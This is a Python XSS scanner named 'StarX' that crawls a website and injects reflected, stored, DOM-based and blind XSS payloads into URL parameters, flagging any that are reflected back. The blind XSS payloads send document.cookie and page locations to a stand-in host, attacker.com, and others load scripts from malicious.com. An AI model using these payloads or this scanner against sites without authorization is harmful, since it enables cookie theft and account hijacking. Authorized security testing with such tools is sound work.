import requests
import urllib.parse
from bs4 import BeautifulSoup
from colorama import Fore, Style, init
import time
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

class StarXSSScanner:
    def __init__(self):
        self.vulnerable_urls = []
        self.payloads = {
            "reflected_xss": [
                "<script>alert('XSS');</script>",
                "<img src=x onerror=alert('XSS')>",
                "<a href='javascript:alert(1)'>Click Me</a>",
                "<svg/onload=alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<img src='x' onerror='alert(1)'>",
                "<script src='http://malicious.com/malicious.js'></script>"
            ],
            "stored_xss": [
                "<script>alert('Stored XSS');</script>",
                "<img src=x onerror=alert('Stored XSS')>",
                "<script>document.cookie='xss=true';</script>",
                "<iframe src='javascript:alert(1)'></iframe>",
                "<script src='http://malicious.com/script.js'></script>"
            ],
            "dom_based_xss": [
                "<script>alert(document.cookie);</script>",
                "<img src='x' onerror='alert(document.cookie)'>",
                "<a href='javascript:alert(document.location)'>Link</a>",
                "<input type='text' value='x' onfocus='alert(1)'>"
            ],
            "blind_xss": [
                "<script>fetch('http://attacker.com', {method: 'POST', body: document.cookie})</script>",
                "<script>new Image().src='http://attacker.com?cookie=' + document.cookie;</script>",
                "<script>fetch('http://attacker.com/capture', {method: 'POST', body: document.location})</script>"
            ]
        }

    def print_banner(self):
        print(Fore.MAGENTA + Style.BRIGHT + "╔═════════════════════════════════════════════╗")
        print(Fore.CYAN + Style.BRIGHT + "       StarX XSS Scanner           ")
        print(Fore.MAGENTA + Style.BRIGHT + "╚═════════════════════════════════════════════╝")

    def is_vulnerable(self, base_url, param, payload, method):
        parsed_url = urllib.parse.urlparse(base_url)
        query = dict(urllib.parse.parse_qsl(parsed_url.query))
        original_value = query.get(param, "")
        query[param] = original_value + payload
        new_query = urllib.parse.urlencode(query)
        new_url = urllib.parse.urlunparse(parsed_url._replace(query=new_query))

        try:
            response = requests.get(new_url, timeout=7)
            content = response.text.lower()
            if payload.lower() in content:
                print(Fore.RED + f"[!] XSS Vulnerability found → Param: {param} | Method: {method} | URL: {new_url} | Payload: {payload}")
                return True
        except requests.exceptions.RequestException:
            pass
        return False

    def scan_url(self, url):
        parsed = urllib.parse.urlparse(url)
        query_params = urllib.parse.parse_qs(parsed.query)
        if not query_params:
            return

        for param in query_params:
            for method, payload_list in self.payloads.items():
                for payload in payload_list:
                    if self.is_vulnerable(url, param, payload, method):
                        full_url = f"{url} | Param: {param} | Method: {method} | Payload: {payload}"
                        self.vulnerable_urls.append(full_url)

    def crawl_website(self, base_url):
        visited = set() 
        to_visit = [base_url]

        while to_visit:
            url = to_visit.pop()
            if url in visited:
                continue  

            visited.add(url)  
            print(Fore.YELLOW + f"[~] Scanning: {url}")

            try:
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = set(a.get('href') for a in soup.find_all('a', href=True))

                    for link in links:
                        full_url = urllib.parse.urljoin(url, link)
                        if base_url in full_url and full_url not in visited:
                            to_visit.append(full_url)  

                    self.scan_url(url)
            except requests.exceptions.RequestException as e:
                print(Fore.RED + f"Error with URL: {url} | {str(e)}")

    def run(self):
        self.print_banner()
        base_url = input(Fore.CYAN + "\nEnter the base URL (example https://example.com | https or http required): ").strip()

        print(Fore.YELLOW + "\n[~] Starting XSS Scan...\n")

        self.crawl_website(base_url)

        print(Fore.CYAN + "\nScan Complete.\n")
        if self.vulnerable_urls:
            print(Fore.RED + "Vulnerabilities Found:")
            for v in self.vulnerable_urls:
                print(Fore.GREEN + "- " + v)
        else:
            print(Fore.GREEN + "No XSS vulnerabilities detected.")

if __name__ == "__main__":
    scanner = StarXSSScanner()
    scanner.run()
